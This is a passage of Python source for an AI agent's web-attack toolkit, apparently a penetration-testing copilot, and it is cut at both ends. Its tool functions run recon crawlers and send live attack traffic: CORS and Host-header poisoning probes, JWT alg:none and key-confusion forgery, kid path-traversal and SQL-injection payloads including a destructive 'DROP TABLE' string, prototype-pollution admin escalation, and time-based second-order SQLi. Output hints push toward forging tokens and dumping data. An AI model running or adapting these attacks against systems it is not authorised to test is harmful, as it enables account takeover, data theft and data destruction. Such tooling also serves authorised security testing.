    Save TEXT content (exploit scripts, payloads, wordlists, notes) to the current
    session directory. Use this for any text you write yourself so it persists
    alongside the session logs and can be referenced by exact path.

    IMPORTANT LIMITS:
    - This tool writes TEXT only. The `content` parameter is a Python string.
    - NEVER use this to save a binary file downloaded from a URL. For that, use
      wget_download(url) which actually fetches and writes the binary data.
    - If you pass a placeholder string like "Binary data from ..." as content, the
      resulting file will be a corrupt text file, NOT the real binary — tshark,
      binwalk, and other tools will reject it.

    Args:
        filename: File name to use (e.g. "exploit.py", "payload.txt", "wordlist.txt")
        content: Text content to write into the file (must be actual text, not a URL or description)
        subfolder: Subfolder within the session directory.
                   Use "exploits" for exploit scripts, or "files" (default) for anything else.
                   Do NOT use "downloads" here for files fetched from URLs — use wget_download.

    Returns:
        Absolute path to the saved file — use this path in subsequent tool calls.
    """
    try:
        from src.repl.target_manager import get_target_manager
        tm = get_target_manager()
        save_dir = tm.get_session_files_dir(subfolder)
        if not save_dir:
            # No active session — fall back to cwd
            path = Path(filename)
            path.write_text(content, encoding="utf-8")
            return f"Saved (no active session): {path.absolute()}"
        filepath = save_dir / filename
        filepath.write_text(content, encoding="utf-8")
        return (
            f"File saved to session.\n"
            f"Path: {filepath.absolute()}\n"
            f"Use this exact path in follow-up tool calls (run_exploit_script, code_analysis, etc.)"
        )
    except Exception as e:
        return f"Error saving file: {e}"


@function_tool()
def arjun_scan(url: str, method: str = "GET", options: str = "") -> str:
    """
    Discover hidden HTTP parameters using Arjun.
    Finds parameters that aren't visible in the UI but accepted by the server,
    which can reveal hidden functionality, debug modes, or injection points.

    Args:
        url: Target URL (e.g., http://example.com/api/endpoint)
        method: HTTP method to test (GET, POST, JSON, XML)
        options: Additional options (--headers "Cookie: xxx", -w custom_wordlist)

    Returns:
        Discovered hidden parameters
    """
    try:
        cmd = [
            "arjun",
            "-u", url,
            "-m", method,
            "--stable",      # stable mode: slower but accurate, no false positives
            "-q", "100",     # 100 params per request — fast enough, avoids rate-limit bans
            "-t", "5",       # 5 threads — polite default
        ]
        if options:
            cmd.extend(options.split())

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout or result.stderr
        if not output or not output.strip():
            return f"No hidden parameters found for {url}"
        return output
    except FileNotFoundError:
        return "Error: arjun not found. Install with: pip install arjun"
    except subprocess.TimeoutExpired:
        return (
            f"Arjun timed out after 5 minutes for {url}.\n"
            "Try narrowing scope: arjun_scan(url, options='--include ""id,name,user,token""')"
        )
    except Exception as e:
        return f"Error running arjun: {str(e)}"


@function_tool()
def gau_urls(domain: str, options: str = "--subs") -> str:
    """
    Fetch known URLs from AlienVault OTX, Wayback Machine, Common Crawl, and URLScan.
    Great for finding old/hidden endpoints, parameters, and forgotten pages.
    
    Args:
        domain: Target domain (e.g., example.com)
        options: Additional options (--subs=include subdomains, --providers wayback, --blacklist png,jpg,gif)
    
    Returns:
        List of discovered URLs from web archives
    """
    try:
        cmd = ["gau"]
        cmd.extend(options.split())
        cmd.append(domain)
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=180
        )
        output = result.stdout or result.stderr
        if output:
            urls = output.strip().split('\n')
            # Deduplicate
            unique_urls = list(set(urls))
            return f"GAU found {len(unique_urls)} unique URLs:\n" + "\n".join(unique_urls[:500])
        return "No URLs found in web archives"
    except FileNotFoundError:
        return "Error: gau not found. Install with: go install github.com/lc/gau/v2/cmd/gau@latest"
    except subprocess.TimeoutExpired:
        return "Error: GAU timed out after 3 minutes"
    except Exception as e:
        return f"Error running gau: {str(e)}"


@function_tool()
def gospider_crawl(url: str, depth: int = 2, options: str = "") -> str:
    """
    Fast web crawler that discovers links, JS files, endpoints, and subdomains.
    Parses JavaScript for hidden API endpoints and keys.
    Automatically filters static assets and groups results by category.

    Args:
        url: Target URL to crawl (e.g., http://example.com)
        depth: Crawl depth (default: 2)
        options: Additional options (--js, -t 10, -a, --sitemap)

    Returns:
        Categorised discovered URLs, endpoints, and JS files
    """
    _JUNK_EXTS = {".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico",
                  ".webp", ".woff", ".woff2", ".ttf", ".eot", ".css",
                  ".mp4", ".mp3", ".mov", ".wav"}
    try:
        cmd = ["gospider", "-s", url, "-d", str(depth), "--js", "-t", "5", "-q"]
        if options:
            cmd.extend(options.split())

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = result.stdout or result.stderr
        if not output or not output.strip():
            return "No results from crawling"

        all_lines = [l.strip() for l in output.splitlines() if l.strip()]

        # Extract and categorise URLs
        all_urls = []
        for line in all_lines:
            # gospider format: [type] - [source] [url]
            m = re.search(r'https?://[^\s"\'>]+', line)
            if m:
                all_urls.append(m.group(0))

        # Filter junk
        clean_urls = [
            u for u in all_urls
            if not any(u.lower().endswith(ext) for ext in _JUNK_EXTS)
        ]

        js_files    = [u for u in clean_urls if u.endswith(".js")]
        api_urls    = [u for u in clean_urls if any(p in u for p in ["/api/", "/v1/", "/v2/", "/graphql", ".json"])]
        param_urls  = [u for u in clean_urls if "?" in u and "=" in u]
        admin_urls  = [u for u in clean_urls if any(k in u.lower() for k in ["/admin", "/dashboard", "/manage"])]
        other_urls  = [u for u in clean_urls if u not in js_files + api_urls + param_urls + admin_urls]

        out = f"## GoSpider: {url}\n"
        out += f"Total crawled: {len(all_urls)} | After filtering: {len(clean_urls)}\n\n"

        def _sec(title, urls, limit=25):
            if not urls:
                return ""
            s = f"### {title} ({len(urls)})\n"
            s += "\n".join(dict.fromkeys(urls[:limit]))  # dedup while preserving order
            if len(urls) > limit:
                s += f"\n  ... and {len(urls) - limit} more"
            return s + "\n\n"

        out += _sec("🎯 URLs With Parameters", param_urls)
        out += _sec("🔌 API / JSON Endpoints", api_urls)
        out += _sec("👑 Admin Paths", admin_urls)
        out += _sec("📄 JavaScript Files", js_files)
        out += _sec("🔗 Other URLs", other_urls)

        return out.strip()
    except FileNotFoundError:
        return "Error: gospider not found. Install: go install github.com/jaeles-project/gospider@latest"
    except subprocess.TimeoutExpired:
        return "Error: GoSpider timed out after 5 minutes"
    except Exception as e:
        return f"Error running gospider: {str(e)}"



# =============================================================================
# ADVANCED WEB VULNERABILITY TOOLS (merged from advanced_web.py)
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

_DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)",
}
_TIMEOUT = 60


def _get(url: str, headers: dict | None = None, **kwargs) -> Optional[requests.Response]:
    try:
        h = {**_DEFAULT_HEADERS, **(headers or {})}
        return requests.get(url, headers=h, timeout=_TIMEOUT,
                            verify=False, allow_redirects=True, **kwargs)
    except Exception as e:
        logger.debug(f"_get {url}: {e}")
        return None


def _post(url: str, data=None, json_data=None, headers: dict | None = None) -> Optional[requests.Response]:
    try:
        h = {**_DEFAULT_HEADERS, **(headers or {})}
        return requests.post(url, data=data, json=json_data,
                             headers=h, timeout=_TIMEOUT, verify=False)
    except Exception as e:
        logger.debug(f"_post {url}: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# 1. CORS Misconfiguration Scanner
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def cors_scan(url: str, options: str = "") -> str:
    """
    Test for CORS misconfiguration vulnerabilities.
    Probes: arbitrary origin reflection, null origin, subdomain wildcard,
    http-downgrade, and pre-flight method bypass.

    Args:
        url: Target URL to probe (e.g. https://api.example.com/data)
        options: Extra options (currently unused, reserved)

    Returns:
        Detailed CORS test results with severity classification
    """
    import urllib.parse
    import requests
    
    results = []
    parsed = urllib.parse.urlparse(url)
    base_domain = parsed.netloc

    probes = [
        ("arbitrary",   {"Origin": "https://evil.com"}),
        ("null",        {"Origin": "null"}),
        ("subdomain",   {"Origin": f"https://evil.{base_domain}"}),
        ("http_down",   {"Origin": f"http://{base_domain}"}),
        ("prefix",      {"Origin": f"https://{base_domain}.evil.com"}),
    ]

    findings = []
    headers = {"User-Agent": "Mozilla/5.0"}

    for probe_name, extra_headers in probes:
        try:
            r = requests.get(url, headers={**headers, **extra_headers}, timeout=10, verify=False)
        except Exception:
            results.append(f"  [{probe_name}] No response")
            continue

        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
        sent_origin = extra_headers["Origin"]

        line = f"  [{probe_name}] Origin: {sent_origin} → ACAO: {acao!r}  ACAC: {acac!r}"

        if acao == sent_origin and acac == "true":
            findings.append({
                "type": "CORS - Arbitrary Origin Reflected",
                "severity": "CRITICAL",
                "evidence": f"Reflected origin {sent_origin} with credentials=true"
            })
        elif acao == sent_origin:
            findings.append({
                "type": "CORS - Arbitrary Origin Reflected",
                "severity": "HIGH",
                "evidence": f"Reflected origin {sent_origin} without credentials"
            })
        elif acao == "*" and acac == "true":
            findings.append({
                "type": "CORS - Wildcard with Credentials",
                "severity": "HIGH",
                "evidence": "Wildcard ACAO with credentials=true"
            })
        elif acao == "null" and acac == "true":
            findings.append({
                "type": "CORS - Null Origin Allowed",
                "severity": "HIGH",
                "evidence": "null origin accepted with credentials=true"
            })

        results.append(line)

    # Pre-flight OPTIONS
    try:
        r_opt = requests.options(
            url,
            headers={**headers,
                     "Origin": "https://evil.com",
                     "Access-Control-Request-Method": "DELETE",
                     "Access-Control-Request-Headers": "X-Custom-Header"},
            timeout=10, verify=False
        )
        acam = r_opt.headers.get("Access-Control-Allow-Methods", "")
        if "DELETE" in acam or "PUT" in acam or "PATCH" in acam:
            findings.append({
                "type": "CORS - Dangerous Pre-flight Methods",
                "severity": "HIGH",
                "evidence": f"Pre-flight allows dangerous methods: {acam}"
            })
        results.append(f"  [preflight] Allow-Methods: {acam!r}")
    except Exception as e:
        results.append(f"  [preflight] Error: {e}")

    output = ["=== CORS Scan: " + url, ""]
    output += results
    output.append("")

    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("")
        output.append("PoC (JavaScript):")
        output.append(
            "  fetch('" + url + "', {credentials:'include'})"
            "\n  .then(r=>r.text()).then(d=>console.log(d))"
        )
    else:
        output.append("No CORS misconfigurations detected.")

    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 2. Host Header Injection / Cache Poisoning
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def host_header_injection(url: str, canary: str = "evil.com") -> str:
    """
    Probe for Host header injection, password-reset poisoning, and web cache
    poisoning via unkeyed headers.

    Args:
        url: Target URL (e.g. https://example.com/forgot-password)
        canary: Canary domain to inject (default: evil.com)

    Returns:
        Findings with injection points and severity
    """
    findings = []
    results = []

    poisoning_headers = [
        ("Host",                  canary),
        ("X-Forwarded-Host",      canary),
        ("X-Host",                canary),
        ("X-Original-URL",        f"https://{canary}/"),
        ("X-Rewrite-URL",         f"https://{canary}/"),
        ("X-Forwarded-Server",    canary),
        ("X-HTTP-Host-Override",  canary),
        ("Forwarded",             f"host={canary}"),
    ]

    _get(url)

    for header_name, header_val in poisoning_headers:
        extra = {header_name: header_val}
        r = _get(url, headers=extra)
        if r is None:
            results.append(f"  [{header_name}] No response")
            continue

        body = r.text or ""
        reflected = canary in body
        redirect_to_canary = canary in r.headers.get("Location", "")

        line = (f"  [{header_name}: {header_val}] "
                f"status={r.status_code}  reflected={reflected}  "
                f"redirect={redirect_to_canary}")
        results.append(line)

        if reflected:
            findings.append(
                f"HIGH → {header_name} reflected in response body — "
                f"Host header injection confirmed. Check password-reset flow."
            )
        if redirect_to_canary:
            findings.append(
                f"CRITICAL → {header_name} causes redirect to {canary} — "
                f"Open redirect / password-reset URL hijacking."
            )

    # Cache poisoning: send poisoned request then clean request
    try:
        _get(url, headers={"X-Forwarded-Host": canary,
                                       "Cache-Control": "no-cache"})
        time.sleep(1)
        clean_r = _get(url)
        if clean_r and canary in (clean_r.text or ""):
            findings.append(
                "CRITICAL → Cache poisoning confirmed — clean response still "
                f"contains '{canary}' after poisoned request"
            )
            results.append("  [cache-poisoning] CONFIRMED — canary persists in cached response")
        else:
            results.append("  [cache-poisoning] Not detected (canary absent from clean response)")
    except Exception as e:
        results.append(f"  [cache-poisoning] Error: {e}")

    output = ["=== Host Header Injection: " + url, ""]
    output += results
    output.append("")
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("")
        output.append("Next step: Test on /forgot-password endpoint specifically.")
    else:
        output.append("No host header injection detected.")
    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 3. GraphQL Introspection + Security Probe
# ─────────────────────────────────────────────────────────────────────────────

_GRAPHQL_ENDPOINTS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/query", "/api/query", "/graphiql", "/playground",
    "/gql", "/api/gql",
]

_INTROSPECTION_QUERY = {
    "query": "{ __schema { types { name kind fields { name args { name type { name kind } } } } } }"
}

_DANGEROUS_MUTATIONS = re.compile(
    r"(delete|remove|drop|reset|purge|admin|create.*user|update.*password|"
    r"escalat|grant|revoke|bypass|disable.*2fa|enable.*admin)",
    re.IGNORECASE,
)


@function_tool()
def graphql_probe(url: str, options: str = "") -> str:
    """
    Discover GraphQL endpoints, test introspection, enumerate dangerous
    mutations, and probe for batch query abuse / auth bypass.

    Args:
        url: Base target URL (e.g. https://api.example.com)
        options: Extra options (unused, reserved)

    Returns:
        GraphQL security assessment
    """
    base = url.rstrip("/")
    found_endpoints = []
    findings = []
    output = [f"=== GraphQL Probe: {base}", ""]

    # Discover endpoints
    output.append("── Endpoint Discovery ─────────────────────────")
    for ep in _GRAPHQL_ENDPOINTS:
        r = _post(base + ep, json_data={"query": "{ __typename }"})
        if r is not None and r.status_code in (200, 400) and (
            "data" in (r.text or "") or "errors" in (r.text or "")
        ):
            found_endpoints.append(base + ep)
            output.append(f"  FOUND: {base + ep} (HTTP {r.status_code})")
        else:
            output.append(f"  {base + ep} — not found (HTTP {r.status_code if r else '?'})")

    if not found_endpoints:
        output.append("\nNo GraphQL endpoints found.")
        return "\n".join(output)

    output.append("")
    gql_url = found_endpoints[0]

    # Introspection
    output.append("── Introspection ──────────────────────────────")
    r = _post(gql_url, json_data=_INTROSPECTION_QUERY)
    if r and r.status_code == 200:
        try:
            data = r.json()
            if "data" in data:
                findings.append(
                    "HIGH → Introspection enabled — full schema exposed. "
                    "Disable in production (graphql-disable-introspection)."
                )
                output.append("  [introspection] ENABLED — full schema leaked")

                # Hunt dangerous mutations
                schema_str = json.dumps(data)
                dangerous = _DANGEROUS_MUTATIONS.findall(schema_str)
                if dangerous:
                    uniq = list(dict.fromkeys(dangerous))
                    findings.append(
                        f"CRITICAL → Dangerous operations in schema: {uniq} — "
                        "test each without authentication"
                    )
                    output.append(f"  [mutations] Dangerous ops: {uniq}")

                # Count types
                types = data.get("data", {}).get("__schema", {}).get("types", [])
                output.append(f"  [schema] {len(types)} types found")
            else:
                output.append("  [introspection] Disabled — query returned errors only")
        except Exception as e:
            output.append(f"  [introspection] Parse error: {e}")
    else:
        output.append(f"  [introspection] HTTP {r.status_code if r else '?'}")

    # Batch query abuse
    output.append("")
    output.append("── Batch Query Abuse ──────────────────────────")
    batch = [{"query": "{ __typename }"}] * 10
    r_batch = _post(gql_url, json_data=batch)
    if r_batch and r_batch.status_code == 200:
        try:
            bd = r_batch.json()
            if isinstance(bd, list) and len(bd) == 10:
                findings.append(
                    "MEDIUM → Batch queries accepted — enables rate-limit bypass "
                    "for brute-force / credential stuffing via GraphQL."
                )
                output.append("  [batch] ACCEPTED — 10 queries in single request")
            else:
                output.append("  [batch] Rejected or partial response")
        except Exception:
            output.append("  [batch] Non-JSON response to batch")
    else:
        output.append(f"  [batch] HTTP {r_batch.status_code if r_batch else '?'}")

    # Alias-based DoS
    alias_query = "{ " + " ".join(f"q{i}: __typename" for i in range(100)) + " }"
    r_alias = _post(gql_url, json_data={"query": alias_query})
    if r_alias and r_alias.status_code == 200 and "q99" in (r_alias.text or ""):
        findings.append(
            "MEDIUM → Alias amplification accepted (100 aliases in one request) — "
            "no query depth/complexity limit configured."
        )
        output.append("  [alias-dos] Accepted 100 aliases — no complexity limit")
    else:
        output.append("  [alias-dos] Complexity limit may be in place")

    output.append("")
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        found_eps_str = "\n  ".join(found_endpoints)
        output.append(f"\nGraphQL endpoints:\n  {found_eps_str}")
    else:
        output.append("No critical GraphQL issues found.")

    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 4. JWT alg:none + Key Confusion Tester
# ─────────────────────────────────────────────────────────────────────────────

def _b64_pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)


def _jwt_decode_part(part: str) -> dict:
    import base64
    try:
        return json.loads(base64.urlsafe_b64decode(_b64_pad(part)).decode())
    except Exception:
        return {}


def _jwt_encode_part(data: dict) -> str:
    import base64
    raw = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


@function_tool()
def jwt_confusion_attack(
    url: str,
    token: str,
    auth_header: str = "Authorization",
    public_key_url: str = "",
    options: str = "",
) -> str:
    """
    Test JWT tokens for: alg:none, RS256→HS256 key confusion, kid path traversal,
    kid SQL injection, and weak secret brute-force.

    Args:
        url: Authenticated endpoint to probe (e.g. https://api.example.com/profile)
        token: Valid JWT token captured from a real session
        auth_header: Header to place token in (default: Authorization)
        public_key_url: URL to fetch public key for RS256→HS256 attack (optional)
        options: Extra options (unused)

    Returns:
        JWT attack results with any bypasses found
    """
    import base64
    import hmac
    import hashlib

    output = [f"=== JWT Confusion Attack: {url}", ""]
    findings = []

    parts = token.split(".")
    if len(parts) != 3:
        return "Error: Not a valid JWT (expected 3 dot-separated parts)"

    header  = _jwt_decode_part(parts[0])
    payload = _jwt_decode_part(parts[1])

    output.append(f"  Algorithm : {header.get('alg', 'unknown')}")
    output.append(f"  Payload   : {json.dumps(payload, indent=2)[:200]}")
    output.append("")

    def _probe(test_token: str, label: str) -> bool:
        """Send token to endpoint, return True if accepted (2xx)."""
        try:
            r = requests.get(
                url,
                headers={**_DEFAULT_HEADERS, auth_header: f"Bearer {test_token}"},
                timeout=_TIMEOUT, verify=False
            )
            accepted = r.status_code < 400
            output.append(f"  [{label}] HTTP {r.status_code} — {'✓ ACCEPTED' if accepted else '✗ rejected'}")
            return accepted
        except Exception as e:
            output.append(f"  [{label}] Error: {e}")
            return False

    # ── Attack 1: alg:none ────────────────────────────────────────────────────
    output.append("── Attack 1: alg:none ─────────────────────────")
    none_hdr   = _jwt_encode_part({**header, "alg": "none"})
    none_pay   = parts[1]
    for suffix in ("", ".", ".."):
        none_tok = f"{none_hdr}.{none_pay}.{suffix}"
        if _probe(none_tok, f"alg:none sig='{suffix}'"):
            findings.append(
                f"CRITICAL → alg:none accepted (suffix='{suffix}') — "
                "JWT signature is NOT verified. Forge any payload."
            )
            break

    # ── Attack 2: RS256 → HS256 key confusion ────────────────────────────────
    output.append("")
    output.append("── Attack 2: RS256→HS256 key confusion ────────")
    pubkey_bytes = b""
    if public_key_url:
        try:
            pk_r = requests.get(public_key_url, timeout=10, verify=False)
            pubkey_bytes = pk_r.content
        except Exception as e:
            output.append(f"  [pubkey] Fetch error: {e}")
    elif header.get("alg") == "RS256":
        # Try common JWK/cert endpoints
        base = url.split("/")[0] + "//" + url.split("/")[2]
        for ep in ("/.well-known/jwks.json", "/api/auth/keys", "/oauth/keys"):
            try:
                pk_r = requests.get(base + ep, timeout=8, verify=False)
                if pk_r.status_code == 200:
                    pubkey_bytes = pk_r.content
                    output.append(f"  [pubkey] Found at {base + ep}")
                    break
            except Exception:
                pass

    if pubkey_bytes:
        confused_hdr = _jwt_encode_part({**header, "alg": "HS256"})
        sig = hmac.new(pubkey_bytes, f"{confused_hdr}.{none_pay}".encode(),
                       hashlib.sha256).digest()
        confused_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        confused_tok = f"{confused_hdr}.{none_pay}.{confused_sig}"
        if _probe(confused_tok, "RS256→HS256"):
            findings.append(
                "CRITICAL → RS256→HS256 key confusion accepted — "
                "server uses public key as HMAC secret. Sign arbitrary payloads."
            )
    else:
        output.append("  [RS256→HS256] Skipped (no public key)")

    # ── Attack 3: kid path traversal ─────────────────────────────────────────
    output.append("")
    output.append("── Attack 3: kid header path traversal ────────")
    for kid_val, secret in (
        ("../../dev/null", ""),
        ("/dev/null", ""),
        ("../../proc/sys/kernel/random/boot_id", "predictable"),
    ):
        pt_hdr = _jwt_encode_part({**header, "kid": kid_val})
        sig = hmac.new(secret.encode(), f"{pt_hdr}.{none_pay}".encode(),
                       hashlib.sha256).digest()
        pt_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        pt_tok = f"{pt_hdr}.{none_pay}.{pt_sig}"
        if _probe(pt_tok, f"kid:{kid_val}"):
            findings.append(
                f"CRITICAL → kid path traversal accepted (kid={kid_val!r}) — "
                "arbitrary file used as HMAC key."
            )
            break

    # ── Attack 4: kid SQL injection ───────────────────────────────────────────
    output.append("")
    output.append("── Attack 4: kid SQL injection ─────────────────")
    sql_kids = [
        ("x' UNION SELECT 'attacker_secret'-- ",  "attacker_secret"),
        ("'; DROP TABLE keys;-- ",                ""),
    ]
    sql_sig = ""
    for kid_sql, expected_secret in sql_kids:
        sql_hdr = _jwt_encode_part({**header, "kid": kid_sql})
        sig = hmac.new(expected_secret.encode(), f"{sql_hdr}.{none_pay}".encode(),
                       hashlib.sha256).digest()
        sql_sig = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        sql_tok = f"{sql_hdr}.{none_pay}.{sql_sig}"
        if _probe(sql_tok, "kid-sqli"):
            findings.append(
                "CRITICAL → kid SQL injection accepted — "
                "JWT kid parameter is interpolated into a SQL query unsanitised."
            )
            break
            
    # ── Attack 5: jku / x5u / jwk external url injection ──────────────────────
    output.append("")
    output.append("── Attack 5: jku / jwk Header Injection ────────")
    output.append("  [jku] To fully test jku, an attacker-controlled JWK Set must be hosted.")
    output.append("  [jku] Testing if server fetches arbitrary jku endpoints...")
    # We will try a blind SSRF/callback url if options contains a callback
    if "callback=" in options:
        callback_url = options.split("callback=")[1].split(";")[0]
        jku_hdr = _jwt_encode_part({**header, "jku": callback_url})
        jku_tok = f"{jku_hdr}.{none_pay}.{sql_sig}" # Bad sig, but we only care if it fetches the url
        _probe(jku_tok, "jku-fetch")
        output.append("  [jku] Check your callback server for incoming requests.")
    else:
        output.append("  [jku] Provide callback=<URL> in options to test blind fetch.")

    output.append("")
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
    else:
        output.append("No JWT vulnerabilities found.")

    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 5. Prototype Pollution Scanner
# ─────────────────────────────────────────────────────────────────────────────

_PP_CANARY = "COPILOT_PP_CANARY"
_PP_PAYLOADS = [
    # JSON body
    {"__proto__": {_PP_CANARY: "1"}},
    {"constructor": {"prototype": {_PP_CANARY: "1"}}},
    # Nested merge
    {"a": {"__proto__": {_PP_CANARY: "1"}}},
]
_PP_QUERY_PAYLOADS = [
    f"__proto__[{_PP_CANARY}]=1",
    f"constructor[prototype][{_PP_CANARY}]=1",
]


@function_tool()
def prototype_pollution_scan(url: str, method: str = "POST", options: str = "") -> str:
    """
    Probe Node.js/JavaScript applications for prototype pollution via JSON body
    and query parameter vectors. Checks both server-side and reflected canary.

    Args:
        url: Target endpoint (e.g. https://app.example.com/api/update)
        method: HTTP method (POST or GET, default: POST)
        options: Extra options (unused)

    Returns:
        Prototype pollution findings
    """
    output = [f"=== Prototype Pollution Scan: {url}", f"  Method: {method}", ""]
    findings = []

    headers_json = {**_DEFAULT_HEADERS, "Content-Type": "application/json"}

    # ── JSON body probes ──────────────────────────────────────────────────────
    output.append("── JSON Body Probes ───────────────────────────")
    for i, payload in enumerate(_PP_PAYLOADS):
        try:
            if method.upper() == "POST":
                r = requests.post(url, json=payload, headers=headers_json,
                                   timeout=_TIMEOUT, verify=False)
            else:
                r = requests.get(url, json=payload, headers=headers_json,
                                  timeout=_TIMEOUT, verify=False)

            body = r.text or ""
            if _PP_CANARY in body:
                findings.append(
                    f"CRITICAL → Prototype pollution confirmed via JSON body "
                    f"(payload #{i+1}) — canary '{_PP_CANARY}' reflected in response. "
                    "Escalate with __proto__[admin]=true or __proto__[isAuthenticated]=true"
                )
                output.append(f"  [json-{i+1}] REFLECTED — canary in response body")
            else:
                output.append(f"  [json-{i+1}] HTTP {r.status_code} — canary not reflected")
        except Exception as e:
            output.append(f"  [json-{i+1}] Error: {e}")

    # ── Query parameter probes ────────────────────────────────────────────────
    output.append("")
    output.append("── Query Parameter Probes ─────────────────────")
    sep = "&" if "?" in url else "?"
    for i, qs in enumerate(_PP_QUERY_PAYLOADS):
        probe_url = url + sep + qs
        r = _get(probe_url)
        body = (r.text or "") if r else ""
        if _PP_CANARY in body:
            findings.append(
                f"CRITICAL → Prototype pollution via query string (payload #{i+1}) — "
                f"canary '{_PP_CANARY}' in response."
            )
            output.append(f"  [qs-{i+1}] REFLECTED — {probe_url}")
        else:
            output.append(f"  [qs-{i+1}] HTTP {r.status_code if r else '?'} — not reflected")

    # ── Privilege escalation probes ───────────────────────────────────────────
    escalation_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"isAuthenticated": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"isAdmin": True}},
    ]
    output.append("")
    output.append("── Privilege Escalation Probes ────────────────")
    for ep in escalation_payloads:
        key = list(ep["__proto__"].keys())[0]
        val = list(ep["__proto__"].values())[0]
        try:
            r = requests.post(url, json=ep, headers=headers_json,
                              timeout=_TIMEOUT, verify=False)
            # Signs of escalation: 200 on previously-403 paths, role in body
            if r.status_code == 200 and (
                "admin" in (r.text or "").lower() or
                '"role"' in (r.text or "")
            ):
                findings.append(
                    f"HIGH → Possible privilege escalation via __proto__[{key}]={val} "
                    f"(HTTP 200, admin-related content in response)"
                )
                output.append(f"  [escalation:{key}] Possible hit — review response")
            else:
                output.append(f"  [escalation:{key}] HTTP {r.status_code}")
        except Exception as e:
            output.append(f"  [escalation:{key}] Error: {e}")

    output.append("")
    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("\nPoC escalation (if server-side PP confirmed):")
        output.append('  curl -X POST ' + url +
                      " -H 'Content-Type: application/json'"
                      ' -d \'{"__proto__":{"admin":true}}\'')
    else:
        output.append("No prototype pollution detected.")

    return "\n".join(output)


# ─────────────────────────────────────────────────────────────────────────────
# 6. Second-Order SQL Injection
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def second_order_sqli(
    register_url: str,
    login_url: str,
    probe_url: str,
    username_field: str = "username",
    password_field: str = "password",
    options: str = "",
) -> str:
    """
    Detect second-order (stored) SQL injection by registering a canary payload
    as a username, logging in, then probing a page that renders the stored value.
    Uses time-based canary detection to avoid false positives.

    Args:
        register_url: Registration endpoint (POST)
        login_url: Login endpoint (POST)
        probe_url: Page that displays the stored username (GET after login)
        username_field: Form field name for username (default: username)
        password_field: Form field name for password (default: password)
        options: Extra options (unused)

    Returns:
        Second-order SQLi assessment
    """
    import uuid

    output = ["=== Second-Order SQLi", f"  Register: {register_url}",
              f"  Login:    {login_url}", f"  Probe:    {probe_url}", ""]
    findings = []
    session = requests.Session()
    session.headers.update(_DEFAULT_HEADERS)
    session.verify = False

    # Time-based payload: 5s sleep — if probe takes >4s after login, it fired
    payloads = [
        ("time_sqli",    "admin'-- -",         "Classic comment truncation"),
        ("time_sleep",   "a' OR SLEEP(5)-- -", "MySQL time-based blind"),
        ("pg_sleep",     "a' OR pg_sleep(5)--","PostgreSQL time-based"),
        ("waitfor",      "a'; WAITFOR DELAY '0:0:5'--", "MSSQL waitfor"),
        ("error_based",  "a'\"",               "Error-based double-quote"),
    ]

    for p_name, username_payload, desc in payloads:
        unique_pass = "probe-" + uuid.uuid4().hex[:18]
        output.append(f"── Payload: {p_name} ({desc}) ─────────────────────")

        # Register
        try:
            reg_r = session.post(
                register_url,
                data={username_field: username_payload, password_field: unique_pass},
                timeout=20, allow_redirects=True
            )
            if reg_r.status_code >= 500:
                findings.append(
                    f"HIGH → Registration with payload '{username_payload}' "
                    f"caused HTTP {reg_r.status_code} — possible error-based SQLi"
                )
            output.append(f"  [register] HTTP {reg_r.status_code}")
        except Exception as e:
            output.append(f"  [register] Error: {e}")
            continue

        # Login
        try:
            login_r = session.post(
                login_url,
                data={username_field: username_payload, password_field: unique_pass},
                timeout=20, allow_redirects=True
            )
            output.append(f"  [login]    HTTP {login_r.status_code}")
        except Exception as e:
            output.append(f"  [login] Error: {e}")
            continue

        # Probe — measure response time
        try:
            t0 = time.time()
            probe_r = session.get(probe_url, timeout=30)
            elapsed = time.time() - t0
            output.append(f"  [probe]    HTTP {probe_r.status_code}  time={elapsed:.2f}s")

            if elapsed >= 4.5 and "sleep" in p_name.lower():
                findings.append(
                    f"CRITICAL → Second-order time-based SQLi confirmed with "
                    f"'{username_payload}' — probe delayed {elapsed:.1f}s "
                    f"(payload stored on register, triggered on probe render)"
                )
            if probe_r.status_code >= 500:
                findings.append(
                    f"HIGH → Probe returned HTTP {probe_r.status_code} after "
                    f"storing '{username_payload}' — possible second-order error-based SQLi"
                )
        except requests.exceptions.Timeout:
            if "sleep" in p_name.lower():
                findings.append(
                    f"CRITICAL → Second-order time-based SQLi confirmed "
                    f"(probe timed out after storing '{username_payload}')"
                )
            output.append("  [probe]    TIMEOUT — possible time-based hit")
        except Exception as e:
            output.append(f"  [probe] Error: {e}")

        output.append("")

    if findings:
        output.append("── FINDINGS ──────────────────────────────────")
        output.extend(findings)
        output.append("\nNext step: sqlmap --second-url to dump data.")
    else:
